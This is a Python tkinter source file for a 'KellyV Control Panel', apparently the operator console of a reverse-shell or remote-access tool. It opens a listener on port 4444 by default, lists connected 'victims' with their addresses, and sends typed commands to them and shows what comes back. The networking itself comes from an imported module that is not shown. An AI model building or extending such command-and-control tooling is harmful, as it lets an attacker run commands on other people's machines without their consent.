from tkinter import *
from main import *
import threading
import queue

# initialization
root = Tk()
root.title("KellyV Control Panel")
root.geometry("500x400")
root.resizable(False, False)
q = queue.Queue()
outputQ = queue.Queue()
errorQ = queue.Queue()
listenMsgQ = queue.Queue()
conQ = queue.Queue()
commandList = []
victimList = ['fsdf','dsfadf']
victimAddrList = ['123','1324']
index = 0
conEST = False
heading5 = None


# tkinter stuff
class KellyV:
    def __init__(self, master):


        def sequence(*functions):
            def func(*args, **kwargs):
                return_value = None
                for function in functions:
                    return_value = function(*args, **kwargs)
                return return_value

            return func


        def createListener():
            for widget in root.winfo_children():
                widget.destroy()
            root.title("Listener Configuration")
            root.geometry("370x150")
            def validate(P):

                if P == '':
                    return True

                else:
                    if P.isdigit():
                        if int(P) < 65536:
                            return True
                        else:
                            return False


                    else:
                        return False


            vcmd = (root.register(validate), '%P')

            t_listen = lambda: threading.Thread(target=listen, args=(str(ip_thing.get()), int(port_thing.get()), int(limit_thing.get()), q, listenMsgQ, conQ)).start()
            #first
            ip_text = Label(master, text="IP:")
            ip_text.pack()
            ip_text.place(x=30, y=10)
            ip_thing = Entry(master)
            ip_thing.pack()
            ip_thing.place(x=30, y=30)
            ip_thing.insert(END, 'localhost')

            # second
            port_text = Label(master, text="Port:")
            port_text.pack()
            port_text.place(x=200, y=10)

            port_thing = Entry(master, validate="key", validatecommand=vcmd)
            port_thing.pack()
            port_thing.place(x=200, y=30)
            port_thing.insert(END, '4444')

            # limit
            limit_text = Label(master, text="Limit:")
            limit_text.pack()
            limit_text.place(x=27, y=55)

            limit_thing = Entry(master, width=5)
            limit_thing.pack()
            limit_thing.place(x=30, y=75)
            limit_thing.insert(END, '1')

            # button
            button_thing = Button(master, text="Create Listener", command=sequence(t_listen, defaultMenu))
            button_thing.pack()
            button_thing.place(x=200, y=75)

        def defaultMenu():
            global heading5
            def outputSender(*args):
                global index
                outputText.configure(state='normal')
                commandList.insert(0, commandInput.get())
                index = 0
                commandInput.delete(0, 'end')
                outputText.delete('1.0', 'end')
                outputText.insert(END, str(outputQ.get()).replace('\\r', '\r').replace('\\n', '\n'))
                outputText.configure(state='disabled')



            def commandListerUp():
                global index
                try:
                    fart = commandList[index]
                    commandInput.delete(0, 'end')
                    print(commandList)
                    print(index)
                    commandInput.insert(END, commandList[index])
                    fart2 = commandList[index + 1]
                    index += 1
                except Exception as exce:
                    print(exce)
            def commandListerDown():
                global index
                try:
                    index -= 1
                    commandInput.delete(0, 'end')
                    print(commandList)
                    print(index)
                    commandInput.insert(END, commandList[index])
                except Exception as exce:
                    print(exce)


            t_sendcommand = lambda x=None: threading.Thread(target=sendCommand, args=(commandInput.get(), q, outputQ, errorQ)).start()

            for widget in root.winfo_children():
                widget.destroy()
            root.title("KellyV Control Panel")
            root.geometry("500x400")
            mainFrame = Frame(master)
            mainFrame.pack()
            # COMMAND HEADING
            heading1 = Label(master, text="Command:")
            heading1.pack()
            heading1.place(x=30, y=350)

            # VICTIM HEADING
            heading2 = Label(master, text="Victims")
            heading2.pack()
            heading2.place(x=350, y=15)

            # OUTPUT HEADING
            heading3 = Label(master, text="Output")
            heading3.pack()
            heading3.place(x=30, y=15)

            # LISTENER MESsAGE HEADING
            heading4 = Label(master, text='')
            heading4.pack()
            heading4.place(x=30, y=335)

            heading5 = Label(master, text='')
            heading5.pack()
            heading5.place(x=30, y=315)

            # OUTPUT TEXT
            outputText = Text(master, width=38, height=17)
            outputText.configure(state='disabled')
            outputText.pack()
            outputText.place(x=35, y=35)
            outputText.config(wrap=WORD)

            # COMMAND ENTRY
            global commandInput
            commandInput = Entry(master, width=60)
            root.bind('<Return>', sequence(t_sendcommand, outputSender))
            root.bind('<Up>', lambda x=None: commandListerUp())
            root.bind('<Down>', lambda x=None: commandListerDown())
            commandInput.pack()
            commandInput.place(x=30, y=375)

            # EXECUTE BUTTON
            executeButton = Button(master, text="Send", command=sequence(t_sendcommand, outputSender))
            executeButton.pack()
            executeButton.place(x=420, y=371)


            # EXECUTE BUTTON
            listenButton = Button(master, text="Create Listener", command=lambda: createListener())
            listenButton.pack()
            listenButton.place(x=400, y=340)

            try:
                heading4.config(text=str(listenMsgQ.get_nowait()))
            except Exception as e:
                print(e)


        def onConnectionEST():
            conEST = True
            victim, victim_address = q.get_nowait()
            heading5.config(text=f"Connection established with {victim_address}")

            for victim in victimList:
                print(victim)
            for address in victimAddrList:
                print(address)

        def update():
            try:
                if conQ.get_nowait() == True:
                    onConnectionEST()
            except queue.Empty:
                pass
            root.after(1000, update)


        defaultMenu()

        root.after(10, update)

e = KellyV(root)

root.mainloop()